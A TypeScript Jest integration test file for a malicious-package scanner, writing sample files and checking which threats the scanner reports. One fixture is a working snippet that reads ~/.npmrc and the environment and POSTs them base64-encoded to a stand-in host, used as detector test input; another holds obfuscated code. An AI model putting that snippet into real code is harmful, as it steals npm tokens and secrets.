/**
 * Integration Tests
 * Migrated from test/integration/scan.test.js to TypeScript
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { scan } from '../../src/scan';
import * as remotePackageScan from '../../src/lib/remotePackageScan';
import fs from 'fs';
import path from 'path';
import os from 'os';

describe('Scan Integration Tests', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nullvoid-test-'));
  });

  afterEach(() => {
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe('scan function', () => {
    it('should scan a directory with malicious files', async () => {
      // Create a malicious test file
      const maliciousFile = path.join(tempDir, 'malicious.js');
      // Reads credentials and the environment, then sends them over the network.
      const maliciousContent = `
        const fs = require('fs');
        const https = require('https');
        const os = require('os');
        const creds = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
        const payload = Buffer.from(JSON.stringify({ env: process.env, creds })).toString('base64');
        https.request({ host: 'collect.example.net', method: 'POST' }).end(payload);
      `;
      fs.writeFileSync(maliciousFile, maliciousContent);

      const result = await scan(tempDir, {
        verbose: false,
        output: 'table',
        all: false,
      });

      const types = result.threats.map((t) => t.type);
      expect(types).toContain('CREDENTIAL_THEFT');
      expect(types).toContain('DATA_EXFILTRATION');
      expect(result.threats.find((t) => t.type === 'CREDENTIAL_THEFT')?.severity).toBe('CRITICAL');
    });

    it('walks directories by maxDirDepth, not by dependency depth', async () => {
      const deep = path.join(tempDir, 'a', 'b', 'c');
      fs.mkdirSync(deep, { recursive: true });
      fs.writeFileSync(
        path.join(deep, 'payload.js'),
        'var _0x4a1b=["a"];function _0x2c3d(_0x5e6f){return _0x4a1b[_0x5e6f];}'
      );

      // depth is the dependency-tree depth; it must not stop the file walk.
      const found = await scan(tempDir, { depth: 1, all: true });
      expect(found.threats.some((t) => t.filePath?.endsWith('payload.js'))).toBe(true);

      // tempDir -> a -> b -> c is four levels; maxDirDepth 3 never reaches c.
      const truncated = await scan(tempDir, { depth: 1, maxDirDepth: 3, all: true });
      expect(truncated.threats.some((t) => t.filePath?.endsWith('payload.js'))).toBe(false);
    });

    it('reports keyword-only dependency names at LOW severity', async () => {
      fs.writeFileSync(
        path.join(tempDir, 'package.json'),
        JSON.stringify({ name: 'app', version: '1.0.0', dependencies: { 'virus-scan': '^1.0.0' } })
      );

      const hidden = await scan(tempDir, {
        all: false,
        iocEnabled: false,
        dependencyConfusionEnabled: false,
        scanDependencySource: false,
      });
      expect(hidden.threats.some((t) => t.type === 'SUSPICIOUS_DEPENDENCY')).toBe(false);

      const shown = await scan(tempDir, {
        all: true,
        iocEnabled: false,
        dependencyConfusionEnabled: false,
        scanDependencySource: false,
      });
      const dep = shown.threats.find((t) => t.type === 'SUSPICIOUS_DEPENDENCY');
      expect(dep?.severity).toBe('LOW');
    });

    it('should scan a directory with clean files', async () => {
      // Create a clean test file
      const cleanFile = path.join(tempDir, 'clean.js');
      const cleanContent = 'function hello() { return "world"; }';
      fs.writeFileSync(cleanFile, cleanContent);

      const result = await scan(tempDir, {
        verbose: false,
        output: 'table',
        all: false,
      });

      expect(result.threats.length).toBe(0);
      expect(result.metadata?.['target']).toBe(tempDir);
    });

    it('should handle empty directories', async () => {
      const result = await scan(tempDir, {
        verbose: false,
        output: 'table',
        all: false,
      });

      expect(result.threats.length).toBe(0);
      expect(result.metadata?.['target']).toBe(tempDir);
    });

    it('should respect the all flag for showing low severity threats', async () => {
      // Create a file with low severity threats
      const suspiciousFile = path.join(tempDir, 'suspicious.js');
      // A lone child_process use is informational: hidden by default, shown with --all.
      const suspiciousContent = 'const { execSync } = require("child_process"); execSync("ls");';
      fs.writeFileSync(suspiciousFile, suspiciousContent);

      const hidden = await scan(tempDir, { verbose: false, output: 'table', all: false });
      expect(hidden.threats.some((t) => t.type === 'CAPABILITY_NOTE')).toBe(false);

      const shown = await scan(tempDir, { verbose: false, output: 'table', all: true });
      const note = shown.threats.find((t) => t.type === 'CAPABILITY_NOTE');
      expect(note?.severity).toBe('LOW');
      expect(note?.message).toContain('child_process');
    });

    it('should scan a remote npm package spec via tarball extract', async () => {
      const maliciousFile = path.join(tempDir, 'malicious.js');
      fs.writeFileSync(
        maliciousFile,
        `
        const _0x112fa8 = "malicious";
        const fs = require('fs');
        eval("malicious code");
      `
      );

      const downloadSpy = jest.spyOn(remotePackageScan, 'downloadPackageToTemp').mockResolvedValue({
        extractDir: tempDir,
        packageName: 'mock-malware',
        version: '1.0.0',
        cleanup: () => undefined,
      });

      const result = await scan('mock-malware@1.0.0', {
        verbose: false,
        iocEnabled: false,
        all: false,
      });

      expect(downloadSpy).toHaveBeenCalledWith('mock-malware', '1.0.0');
      expect(result.filesScanned).toBeGreaterThan(0);
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.metadata?.['target']).toBe('mock-malware@1.0.0');
      downloadSpy.mockRestore();
    });
  });

  describe('progress callback', () => {
    it('should call progress callback for each file', async () => {
      // Create test files
      const file1 = path.join(tempDir, 'file1.js');
      const file2 = path.join(tempDir, 'file2.js');
      fs.writeFileSync(file1, 'console.log("hello");');
      fs.writeFileSync(file2, 'console.log("world");');

      await scan(tempDir, {
        verbose: false,
        output: 'table',
        all: false,
      });

      // Test passes if scan completes without error
      expect(true).toBe(true);
    });
  });
});
